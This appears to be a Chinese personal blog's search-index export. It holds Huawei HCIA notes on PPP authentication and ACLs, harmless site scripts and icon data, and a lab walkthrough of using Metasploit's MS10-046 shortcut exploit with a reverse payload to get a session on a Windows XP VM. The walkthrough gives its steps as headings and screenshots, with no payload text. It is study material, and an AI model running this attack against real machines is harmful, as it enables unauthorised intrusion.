Address/Mask      Physical   Protocol  </span><br><span class="line">Dialer1                           202.100.1.1/32       up         up(s)  </span><br><span class="line">[R1]display ip routing-table </span><br><span class="line">202.100.1.1/32  Direct  0    0           D   127.0.0.1       Dialer1</span><br><span class="line">202.100.1.2/32  Direct  0    0           D   202.100.1.2     Dialer1</span><br></pre></td></tr></table></figure><p>认证配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//服务器认证</span><br><span class="line">[R2-Virtual-Template1]ppp authentication-mode chap </span><br><span class="line">//客户端认证</span><br><span class="line"> interface Serial1/0/0</span><br><span class="line"> link-protocol ppp</span><br><span class="line"> ppp chap user chen</span><br><span class="line"> ppp chap password cipher chen</span><br><span class="line"> ppp pap local-user chen password cipher chen</span><br></pre></td></tr></table></figure><hr><h1 id="ACL基础"><a href="#ACL基础" class="headerlink" title="ACL基础"></a>ACL基础</h1><p>访问控制列表（Access Control List）：对网络访问行为的控制、限制网络流量、提高网络性能、防止网络攻击。</p><ul><li>包过滤</li><li>抓取路由表</li><li>流量分类</li><li>NAT </li></ul><p>行为：拒绝（deny）、允许（permit）</p><p>比较常用的安全技术或者是流量匹配工具或者是路由匹配工具</p><p>基本acl：只能命中流量的源IP</p><p>高级acl：命中流量的源IP、目的IP、协议、源目端口、功能位。</p><p>规则用数字来标识，越精准的流量数字（规则序号）应该更小，因为acl一旦命中流量，后续流量将忽略。</p><p>大部分ACL最后一个规则（隐含）拒绝所有流量<br>但是华为设备应用到接口并非如此（允许所有）</p><hr><p>拒绝PC1和R1通信</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]acl number 2000</span><br><span class="line">[R1-acl-basic-2000]rule 1 deny source 10.1.10.1 0</span><br><span class="line">[R1-GigabitEthernet0/0/1]traffic-filter inbound acl 2000//应用到接口</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PC&gt;ping 11.1.1.1 </span><br><span class="line">Ping 11.1.1.1: 32 data bytes, Press Ctrl_C to break</span><br><span class="line">Request timeout!</span><br><span class="line">Request timeout!</span><br></pre></td></tr></table></figure><hr><p>其他重要内容诸如方向（入或者出）、通配符掩码</p><p>生效条件：流量经过应用ACL的路由器或者流量到达的路由器才有效，ACL应用到流量发起的设备上无效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[R1-acl-adv-3000]rule 10 deny ip source 11.1.1.1 0 destination 10.1.10.1 0//高级访问控制列表</span><br><span class="line">[R1-GigabitEthernet0/0/1]traffic-filter outbound acl 3000</span><br><span class="line">[R1-GigabitEthernet0/0/2]traffic-filter outbound acl 3000 </span><br><span class="line"></span><br><span class="line">acl 3000</span><br><span class="line"> rule 10 deny ip source 11.1.1.1 0 destination 10.1.10.1 0 </span><br><span class="line"> rule 20 deny ip source 10.1.11.1 0 destination 10.1.10.1 0 </span><br></pre></td></tr></table></figure><hr><blockquote><p>通配符掩码（0代表某个特定主机，“反掩码”，代表范围，0代表不能变化的match，1代表任意变化的ignore）</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HCIA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用MSF渗透框架实现文件快捷方式漏洞攻击</title>
      <link href="/posts/91ebd212/"/>
      <url>/posts/91ebd212/</url>
      
        <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>攻击主机：Kali linux version 5.10.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip ：192.168.30.131</p><p>靶&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;机：Windows XP Professional&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iP：192.168.30.135</p><hr><h1 id="渗透提权过程"><a href="#渗透提权过程" class="headerlink" title="渗透提权过程"></a><strong>渗透提权过程</strong></h1><h2 id="进入metasploit"><a href="#进入metasploit" class="headerlink" title="进入metasploit"></a><strong>进入metasploit</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec01.png" alt=""></p><h2 id="search寻找ms10-046攻击模块"><a href="#search寻找ms10-046攻击模块" class="headerlink" title="search寻找ms10_046攻击模块"></a><strong>search寻找ms10_046攻击模块</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec02.png" alt=""></p><h2 id="使用第一个模块（use-模块名称）"><a href="#使用第一个模块（use-模块名称）" class="headerlink" title="使用第一个模块（use + 模块名称）"></a><strong>使用第一个模块（use + 模块名称）</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec03.png" alt=""></p><h2 id="设置payload反弹"><a href="#设置payload反弹" class="headerlink" title="设置payload反弹"></a><strong>设置payload反弹</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec04.png" alt=""></p><h2 id="使用show-options命令，查看需设置的参数"><a href="#使用show-options命令，查看需设置的参数" class="headerlink" title="使用show options命令，查看需设置的参数"></a><strong>使用show options命令，查看需设置的参数</strong></h2><p><strong>需要设置的是SRVHOST、LHOS</strong></p><p><strong>设置为攻击主机的IP地址</strong></p><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec05.png" alt=""></p><h2 id="exploit生成链接"><a href="#exploit生成链接" class="headerlink" title="exploit生成链接"></a><strong>exploit生成链接</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec06.png" alt=""></p><h2 id="在WinXP访问链接，生成两个快捷方式"><a href="#在WinXP访问链接，生成两个快捷方式" class="headerlink" title="在WinXP访问链接，生成两个快捷方式"></a><strong>在WinXP访问链接，生成两个快捷方式</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec07.png" alt=""></p><h2 id="通过session-i-查看会话"><a href="#通过session-i-查看会话" class="headerlink" title="通过session -i 查看会话"></a><strong>通过session -i 查看会话</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec08.png" alt=""></p><h2 id="通过session-i-1使用会话1"><a href="#通过session-i-1使用会话1" class="headerlink" title="通过session -i 1使用会话1"></a><strong>通过session -i 1使用会话1</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec09.png" alt=""></p><h2 id="通过查看进程等命令，成功进入"><a href="#通过查看进程等命令，成功进入" class="headerlink" title="通过查看进程等命令，成功进入"></a><strong>通过查看进程等命令，成功进入</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec10.png" alt=""></p><h2 id="使用screenshot获取屏幕当前信息"><a href="#使用screenshot获取屏幕当前信息" class="headerlink" title="使用screenshot获取屏幕当前信息"></a><strong>使用screenshot获取屏幕当前信息</strong></h2><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/Security/sec11.png" alt=""></p><hr>]]></content>
      
      
      <categories>
          
          <category> 学习实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali-Linux </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title></title>
      <link href="/collect/index.html"/>
      <url>/collect/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/photo/index.html"/>
      <url>/photo/index.html</url>
      
        <content type="html"><![CDATA[<div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/%E5%B0%81%E9%9D%A2/FM13.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">动漫壁纸</div>  <p>好看的动漫壁纸</p>  <a href='/wallpaper'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/th.jpg' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">必应精选</div>  <p>必应每日精选壁纸</p>  <a href='/wallpaper1'></a>  </figcaption>  </figure>  </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<div class="gallery-group-main">  <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/22.PNG' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">学习笔记</div>  <p>学习中的随笔</p>  <a href='/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/10.PNG' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">学习实验</div>  <p>边学边做</p>  <a href='/categories/%E5%AD%A6%E4%B9%A0%E5%AE%9E%E9%AA%8C/'></a>  </figcaption>  </figure>     <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/22.PNG' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">学习笔记</div>  <p>学习中的随笔</p>  <a href='/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/'></a>  </figcaption>  </figure>    <figure class="gallery-group">  <img class="gallery-group-img no-lightbox" src='https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/10.PNG' alt="Group Image Gallery">  <figcaption>  <div class="gallery-group-name">学习实验</div>  <p>边学边做</p>  <a href='/categories/%E5%AD%A6%E4%B9%A0%E5%AE%9E%E9%AA%8C/'></a>  </figcaption>  </figure>  </div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/title.js"/>
      <url>/js/title.js</url>
      
        <content type="html"><![CDATA[//动态标题var OriginTitile = document.title;var titleTime;document.addEventListener("visibilitychange", function () {  if (document.hidden) {    //离开当前页面时标签显示内容    document.title = "w(ﾟДﾟ)w 不要走！再看看嘛！";    clearTimeout(titleTime);  } else {    //返回当前页面时标签显示内容    document.title = "♪(^∇^*)欢迎肥来！" + OriginTitile;    //两秒后变回正常标题    titleTime = setTimeout(function () {      document.title = OriginTitile;    }, 2000);  }});]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<div align='center'>    <font size="10"><b>关于作者🦉</b></font>    <font size="4"><p><b>满怀希望就能所向无敌💨</b></p></font></div><div>    <font size="4">Hello！欢迎各位小伙伴来到南柯一梦的个人博客🥰，我是一个热爱分享、喜欢钻研技术知识的Boy👦<br>    <p>平时我会在这里做一些学习的笔记📖，不得不说，记笔记是一件非常有意义的事情💪</p>    </font></div><blockquote><p><del>一个网站搭了三天</del>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不不不！这不重要👋👋👋</p></blockquote><div>    <font size="4">    <p>目前小时是一名勤劳的打工人💼，主要学习的是路由交换以及网络安全的知识🗒️</p>    <p>🔊在所有的过错中，我们最易于原谅的就是懒散。——拉罗什富科</p>     <p>在今后的工作学习中，我会把自己学到的东西做过的实验记录在我的博客😉</p>    <br>    </font></div><div>    <font size="4">    <p><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>致力于成为一名IT小佬🤚</p>            </div> </p>    <p><div class='checkbox green checked'><input type="checkbox" checked="checked"/>            <p>又菜又爱瞎折腾，拆拆拆！买买买🤯</p>            </div> </p>    <p><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>擅长PS、Pr、Ae、Au、Ai、Dw、An、Id等软件的安装与卸载👀</p>            </div> </p>    <p><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>熟练Windows、Linux、Mac、Android、IOS等系统的开关机👻</p>            </div> </p>    <p><div class='checkbox times red checked'><input type="checkbox" checked="checked"/>            <p>精通Html、CSS、JavaScript、PHP、Java、Python、C、C++、C#、Go等单词的拼写🐾</p>            </div> </p>    </font></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/custom.js"/>
      <url>/js/custom.js</url>
      
        <content type="html"><![CDATA[// 返回顶部显示网页阅读进度window.onscroll = percent;// 执行函数// 页面百分比function percent() {    let a = document.documentElement.scrollTop || window.pageYOffset, // 卷去高度        b = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight) - document.documentElement.clientHeight, // 整个网页高度        result = Math.round(a / b * 100), // 计算百分比        up = document.querySelector("#go-up") // 获取按钮    if (result <= 95) {        up.childNodes[0].style.display = 'none'        up.childNodes[1].style.display = 'block'        up.childNodes[1].innerHTML = result;    } else {        up.childNodes[1].style.display = 'none'        up.childNodes[0].style.display = 'block'    }}// 分享本页function share() {    let url = window.location.origin + window.location.pathname    new ClipboardJS(".share", { text: function() { return '标题：' + document.title + '\n链接：' + url } });    btf.snackbarShow("本页链接已复制到剪切板，快去分享吧~")}// 如果当前页有评论就执行函数if (document.getElementById('post-comment')) owoBig();// 表情放大function owoBig() {    let flag = 1, // 设置节流阀        owo_time = '', // 设置计时器        m = 3; // 设置放大倍数    // 创建盒子    let div = document.createElement('div'),        body = document.querySelector('body');    // 设置ID    div.id = 'owo-big';    // 插入盒子    body.appendChild(div)    // 构造observer    let observer = new MutationObserver(mutations => {        for (let i = 0; i < mutations.length; i++) {            let dom = mutations[i].addedNodes,                owo_body = '';            if (dom.length == 2 && dom[1].className == 'OwO-body') owo_body = dom[1];            // 如果需要在评论内容中启用此功能请解除下面的注释            // else if (dom.length == 1 && dom[0].className == 'tk-comment') owo_body = dom[0];            else continue;                        // 禁用右键（手机端长按会出现右键菜单，为了体验给禁用掉）            if (document.body.clientWidth <= 768) owo_body.addEventListener('contextmenu', e => e.preventDefault());            // 鼠标移入            owo_body.onmouseover = (e) => {                    if (flag && e.target.tagName == 'IMG') {                        flag = 0;                        // 移入300毫秒后显示盒子                        owo_time = setTimeout(() => {                            let height = e.target.clientHeight * m, // 盒子高 2023-02-16更新                                width = e.target.clientWidth * m, // 盒子宽 2023-02-16更新                                left = (e.x - e.offsetX) - (width - e.target.clientWidth) / 2, // 盒子与屏幕左边距离 2023-02-16更新                                top = e.y - e.offsetY; // 盒子与屏幕顶部距离                            if ((left + width) > body.clientWidth) left -= ((left + width) - body.clientWidth + 10); // 右边缘检测，防止超出屏幕                            if (left < 0) left = 10; // 左边缘检测，防止超出屏幕                            // 设置盒子样式                            div.style.cssText = `display:flex; height:${height}px; width:${width}px; left:${left}px; top:${top}px;`;                            // 在盒子中插入图片                            div.innerHTML = `<img src="${e.target.src}">`                        }, 300);                    }                };            // 鼠标移出隐藏盒子            owo_body.onmouseout = () => { div.style.display = 'none', flag = 1, clearTimeout(owo_time); }        }    })    observer.observe(document.getElementById('post-comment'), { subtree: true, childList: true }) // 监听的 元素 和 配置项}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/ali_font.js"/>
      <url>/js/ali_font.js</url>
      
        <content type="html"><![CDATA[!function(a){var l,c,t,h,i,p='<svg><symbol id="icon-icon" viewBox="0 0 1024 1024"><path d="M400.696 268.795c-17.249 0-31.233 13.986-31.233 31.233v30.471c0 17.249 13.986 31.233 31.233 31.233s31.233-13.986 31.233-31.233v-30.471c0-17.249-13.985-31.233-31.233-31.233z"  ></path><path d="M623.649 361.734c17.249 0 31.234-13.986 31.234-31.233v-30.471c0-17.249-13.986-31.233-31.234-31.233s-31.233 13.986-31.233 31.233v30.471c-0.001 17.248 13.985 31.233 31.233 31.233z"  ></path><path d="M438.295 388.804c-14.656 9.104-19.155 28.362-10.050 43.013 11.209 18.047 41.976 48.59 86.157 48.59 43.958 0 75.1-30.313 86.574-48.223 9.303-14.529 5.068-33.847-9.455-43.15-14.539-9.298-33.852-5.068-43.15 9.455-0.122 0.199-13.38 19.45-33.969 19.45-20.009 0-32.444-18.128-33.278-19.373-9.166-14.423-28.28-18.805-42.829-9.761z"  ></path><path d="M824.508503 116.690676 571.592236 116.690676c-17.248849 0-31.233352 13.985526-31.233352 31.233352s13.985526 31.233352 31.233352 31.233352l252.916267 0c40.181141 0 72.878844 32.692586 72.878844 72.878844l0 396.966057-189.334159-165.29465c-12.20088-10.655687-30.517037-10.207479-42.173518 0.9967L468.578048 674.16231 309.521472 517.519714c-11.895935-11.70253-30.903847-12.002358-43.154869-0.645706L126.957507 646.163629l0-394.126382c0-40.186258 32.692586-72.878844 72.878844-72.878844l252.916267 0c17.248849 0 31.233352-13.985526 31.233352-31.233352S470.000444 116.690676 452.751594 116.690676L199.836351 116.690676c-74.632791 0-135.346571 60.71378-135.346571 135.346571l0 520.56405c0 74.632791 60.71378 135.346571 135.346571 135.346571l252.916267 0c17.248849 0 31.233352-13.985526 31.233352-31.233352s-13.985526-31.233352-31.233352-31.233352L199.836351 845.481164c-40.186258 0-72.878844-32.692586-72.878844-72.878844l0-41.23924 160.003134-148.385539 159.428036 157.007917c12.048407 11.865235 31.361265 11.981892 43.546795 0.274246l198.576661-190.68697 208.876238 182.346001 0 40.683585c0 40.186258-32.697703 72.878844-72.878844 72.878844L571.592236 845.481164c-17.248849 0-31.233352 13.985526-31.233352 31.233352s13.985526 31.233352 31.233352 31.233352l252.916267 0c74.627674 0 135.346571-60.71378 135.346571-135.346571L959.855074 252.037247C959.855074 177.404456 899.136178 116.690676 824.508503 116.690676z"  ></path></symbol><symbol id="icon-tupian1" viewBox="0 0 1024 1024"><path d="M821.10626562 178.54271301L202.89277437 178.54271301c-60.47931469 0-109.68339469 49.20408-109.68339468 109.68339469L93.20937969 906.43959894c0 60.47931469 49.20408 109.68339469 109.68339469 109.68339469l618.21349125 0c60.47931469 0 109.68339469-49.20408 109.68339468-109.68339468L930.78966031 288.22610769C930.78966031 227.74679301 881.58654031 178.54271301 821.10626562 178.54271301zM202.89277437 218.42767176l618.21349126 0c38.48622656 0 69.79843688 31.31125125 69.79843687 69.79843687l0 128.02232063c-140.71355625 4.932975-272.22215344 61.95383531-372.16719094 161.89887281-46.83832406 46.83928313-84.226095 100.62329719-111.27591468 159.02370187-78.27812719-66.40809563-191.59937531-70.66568906-274.36725938-12.766065L133.09433844 288.22610769C133.09433844 249.73892207 164.40558875 218.42767176 202.89277437 218.42767176zM133.09433844 906.43959894L133.09433844 776.0467252c71.7583875-69.66700594 186.40641656-69.59505469 258.06790969 0.22928437-22.78455188 61.217055-34.712145 126.66771938-34.71214501 193.97952188 0 2.08466625 0.32234156 4.093545 0.91617844 5.98250343L202.89277437 976.23803582C164.40558875 976.23803582 133.09433844 944.92678457 133.09433844 906.43959894zM821.10626562 976.23803582L395.41888156 976.23803582c0.59383781-1.88895937 0.91617844-3.89783719 0.91617844-5.98250344 0-137.54770312 53.48757562-266.78647875 150.60732844-363.90623156 92.41030594-92.41030594 213.90617156-145.27814156 343.96327312-150.19192969L890.90566156 906.43959894C890.9047025 944.92678457 859.59345125 976.23803582 821.10626562 976.23803582z" fill="#e0620d" ></path><path d="M324.87311188 504.95084863c57.03525 0 103.43706938-46.40086031 103.43706937-103.43706937s-46.40086031-103.43706938-103.43706938-103.43706938-103.43706938 46.40086031-103.43706937 103.43706938S267.83690281 504.95084863 324.87311188 504.95084863zM324.87311188 337.96262676c35.04216188 0 63.55211156 28.50899063 63.55211156 63.55211156s-28.50899063 63.55211156-63.55211157 63.55211156-63.55211156-28.50899063-63.55211156-63.55211156S289.82999094 337.96262676 324.87311188 337.96262676z" fill="#e0620d" ></path></symbol><symbol id="icon-tupian" viewBox="0 0 1024 1024"><path d="M187.733333 870.4c-5.12 0-10.24-1.706667-15.36-3.413333-17.066667-8.533333-23.893333-29.013333-15.36-46.08l102.4-204.8c5.12-10.24 17.066667-18.773333 29.013334-18.773334s23.893333 5.12 30.72 15.36l102.4 155.306667 162.133333-337.92c5.12-11.946667 17.066667-18.773333 29.013333-18.773333s23.893333 5.12 30.72 17.066666l238.933334 392.533334c10.24 15.36 5.12 37.546667-11.946667 46.08-15.36 10.24-37.546667 5.12-46.08-11.946667L617.813333 515.413333l-160.426666 336.213334c-5.12 10.24-15.36 18.773333-29.013334 18.773333-11.946667 0-23.893333-5.12-30.72-15.36L293.546667 699.733333l-76.8 151.893334c-5.12 11.946667-17.066667 18.773333-29.013334 18.773333z" fill="#3793DF" ></path><path d="M844.8 887.466667h-648.533333c-37.546667 0-68.266667-30.72-68.266667-68.266667V307.2c0-37.546667 30.72-68.266667 68.266667-68.266667h648.533333c37.546667 0 68.266667 30.72 68.266667 68.266667v512c0 37.546667-30.72 68.266667-68.266667 68.266667z m0-68.266667v34.133333-34.133333z m-648.533333-512v512h648.533333V307.2h-648.533333z" fill="#3793DF" ></path><path d="M315.733333 537.6c-47.786667 0-85.333333-37.546667-85.333333-85.333333s37.546667-85.333333 85.333333-85.333334 85.333333 37.546667 85.333334 85.333334-37.546667 85.333333-85.333334 85.333333z m0-102.4c-10.24 0-17.066667 6.826667-17.066666 17.066667s6.826667 17.066667 17.066666 17.066666 17.066667-6.826667 17.066667-17.066666-6.826667-17.066667-17.066667-17.066667z" fill="#EB4AF4" ></path></symbol><symbol id="icon-bilibili-fill" viewBox="0 0 1024 1024"><path d="M814.09668779 79.26821888a60.6814811 60.6814811 0 0 1 0 85.82788779L758.60954112 220.53470777h56.79786667A182.04444445 182.04444445 0 0 1 997.45185223 402.62769778v364.08888889a182.04444445 182.04444445 0 0 1-182.04444444 182.04444444H208.59259221A182.04444445 182.04444445 0 0 1 26.54814777 766.71658667v-364.08888889a182.04444445 182.04444445 0 0 1 182.04444444-182.04444445h56.60368669L209.80622222 165.14465223a60.6814811 60.6814811 0 1 1 85.77934223-85.82788778l128.7418311 128.7418311c3.83507001 3.83507001 7.03905223 8.00995555 9.61194667 12.47611222h155.97568c2.57289443-4.46615666 5.82542222-8.73813333 9.66049223-12.52465778l128.69328555-128.74183111a60.6814811 60.6814811 0 0 1 85.82788779 0z m1.31072 263.11490446H208.59259221a60.6814811 60.6814811 0 0 0-60.53584554 56.16677888l-0.14563556 4.56324779v364.08888889c0 31.99127666 24.75804445 58.20567666 56.16677888 60.48729998l4.51470222 0.19418112h606.81481558a60.6814811 60.6814811 0 0 0 60.53584554-56.16677888l0.14563556-4.51470222v-364.08888889c0-33.49617778-27.18530333-60.6814811-60.6814811-60.68148224z m-485.45185224 121.36296221c33.49617778 0 60.6814811 27.18530333 60.68148111 60.68148224v60.6814811a60.6814811 60.6814811 0 1 1-121.36296221 0v-60.6814811c0-33.49617778 27.18530333-60.6814811 60.6814811-60.68148224z m364.0888889 0c33.49617778 0 60.6814811 27.18530333 60.6814811 60.68148224v60.6814811a60.6814811 60.6814811 0 1 1-121.36296221 0v-60.6814811c0-33.49617778 27.18530333-60.6814811 60.68148111-60.68148224z" fill="#1296db" ></path></symbol><symbol id="icon-icon_bilibili" viewBox="0 0 1024 1024"><path d="M409.44508319 419.00157204l-202.22305504 38.71788337 17.31684392 75.89513833 200.18477065-38.71597797-15.27855953-75.89704373z m109.00344778 201.20105218c-49.40887183 105.94697302-93.72298284 25.97907842-93.72298117 25.97908011l-33.10449695 21.39722693s65.19271066 89.14113136 127.34038746 21.39150732c73.35157125 67.74962402 129.38057895-21.9006025 129.38057895-21.90060247l-30.0556489-19.35703547c0.00190708-0.51100059-52.46343949 75.38413605-99.83783939-27.51017642z m99.83974482-125.30782097L818.98214158 533.61077954l16.80774877-75.89513661-201.71014736-38.71788507-15.7914672 75.89704539z m398.48570129-149.02553023c-3.19375868-141.37767024-126.50333583-168.48934115-126.50333586-168.48934118s-96.20744003-0.53006817-221.11675884-1.59592577l90.89340867-87.69965s14.34998586-18.07381268-10.09990333-38.26599098c-24.45370166-20.19599247-26.04772037-11.16194677-34.54788541-5.84410122-7.44383952 5.31212595-116.4072467 112.14763207-135.53928862 131.28539363-49.42793774 0-100.98949782-0.53578945-150.95131794-0.53578946h17.53993034s-130.22144307-128.62742439-138.7273277-134.47152391c-8.50588464-5.84600831-9.56792805-14.34617166-34.54979083 5.84410118-24.4498875 20.19789957-10.09990332 38.26789806-10.09990331 38.26789809l93.01558844 90.35952464c-100.98759072 0-188.16289215 0.53578945-228.55487877 2.12599564-130.75723254 37.74164241-120.65542212 169.02322351-120.65542211 169.0232235s1.59211161 281.70855044 0 424.15779625c14.34998586 142.44924747 123.84345951 165.29748956 123.84346119 165.29748957s43.58383654 1.06395052 76.01144757 1.06395054c3.1842249 9.03595279 5.84219412 53.68373986 55.80973549 53.68374154 49.42984484 0 55.8059213-53.68373986 55.80592132-53.68374154s364.09607451-1.59211161 394.39006321-1.5921116c1.5978329 15.41202927 9.03976531 56.33980367 59.00158538 55.8116409 49.42793774-1.06585763 53.14795207-58.99777291 53.14795209-58.99777289s17.01176757-1.5959258 67.50365753 0c118.00126539-21.79573244 124.90741005-159.98917781 124.90741005-159.98917613s-2.12027438-284.37033387-0.52434856-425.7556308zM915.252504 796.60676657c0 22.32198644-17.54183744 40.39198495-39.3337557 40.39198495H158.36801335c-21.79191825 0-39.3318486-18.0699985-39.3318486-40.39198495V320.89122276c0-22.32580062 17.54183744-40.39770621 39.3318486-40.39770624h717.55073495c21.79191825 0 39.33375569 18.0719056 39.3337557 40.39770624v475.71554381z" fill="#d4237a" ></path></symbol><symbol id="icon-bilibili-line" viewBox="0 0 1024 1024"><path d="M306.005333 117.632L444.330667 256h135.296l138.368-138.325333a42.666667 42.666667 0 0 1 60.373333 60.373333L700.330667 256H789.333333A149.333333 149.333333 0 0 1 938.666667 405.333333v341.333334a149.333333 149.333333 0 0 1-149.333334 149.333333h-554.666666A149.333333 149.333333 0 0 1 85.333333 746.666667v-341.333334A149.333333 149.333333 0 0 1 234.666667 256h88.96L245.632 177.962667a42.666667 42.666667 0 0 1 60.373333-60.373334zM789.333333 341.333333h-554.666666a64 64 0 0 0-63.701334 57.856L170.666667 405.333333v341.333334a64 64 0 0 0 57.856 63.701333L234.666667 810.666667h554.666666a64 64 0 0 0 63.701334-57.856L853.333333 746.666667v-341.333334A64 64 0 0 0 789.333333 341.333333zM341.333333 469.333333a42.666667 42.666667 0 0 1 42.666667 42.666667v85.333333a42.666667 42.666667 0 0 1-85.333333 0v-85.333333a42.666667 42.666667 0 0 1 42.666666-42.666667z m341.333334 0a42.666667 42.666667 0 0 1 42.666666 42.666667v85.333333a42.666667 42.666667 0 0 1-85.333333 0v-85.333333a42.666667 42.666667 0 0 1 42.666667-42.666667z" fill="#d4237a" ></path></symbol><symbol id="icon-yun" viewBox="0 0 1024 1024"><path d="M774.04286461 856.24098724c72.49414281-15.53445925 129.45382756-77.6722963 129.45382634-155.3445926 0-88.02860206-67.31599053-155.34459259-155.34459258-155.34459259-20.71261275 0-36.24707201 5.17815349-51.78153006 10.35630698V545.55180205c0-113.91936831-93.20675555-207.12612386-207.12612386-207.12612265s-207.12612386 93.20675555-207.12612386 207.12612265c0 20.71261275 5.17815349 36.24707201 5.17815349 56.95968476-10.35630577-5.17815349-20.71261275-5.17815349-31.06891852-5.17815349C183.73341276 597.33333332 126.773728 654.29301687 126.773728 726.78716088S183.73341276 856.24098724 256.22755556 856.24098724h517.81530905z m0 103.56306253h-517.81530905C126.773728 959.80404977 23.21066667 856.24098724 23.21066667 726.78716088c0-103.56306132 67.31599053-191.59166461 155.34459259-222.66058311C199.26787201 353.96013866 328.72169837 234.86261687 489.24444445 234.86261687c134.63197984 0 253.72950164 88.02860206 295.15472592 207.12612386 124.27567408 15.53445925 222.66058311 124.27567408 222.66058312 258.90765391s-103.56306132 243.37319466-233.01688888 258.90765513z" fill="#1296db" ></path></symbol><symbol id="icon-yun1" viewBox="0 0 1424 1024"><path d="M335.91304356 883.73913066h704.34782578v78.26086934H335.91304356zM1040.26086934 962v-78.26086933a195.65217422 195.65217422 0 0 0 195.65217422-195.65217422h78.26086933a273.91304356 273.91304356 0 0 1-273.91304355 273.91304355zM335.91304356 962a273.91304356 273.91304356 0 0 1-273.91304356-273.91304356h78.26086934a195.65217422 195.65217422 0 0 0 195.65217422 195.65217422zM1314.17391289 688.08695644h-78.26086933a195.65217422 195.65217422 0 0 0-146.73913067-188.60869599L1059.82608711 492.43478223v-39.13043467a195.65217422 195.65217422 0 0 0-195.65217422-195.65217334 200.73913067 200.73913067 0 0 0-45.39130401 5.86956533l-25.4347831 6.26086933-15.26086934-21.52173955A253.95652177 253.95652177 0 0 0 316.34782578 394.60869599V492.43478223l-29.34782578 7.4347831A195.65217422 195.65217422 0 0 0 140.26086934 688.08695644H62a273.91304356 273.91304356 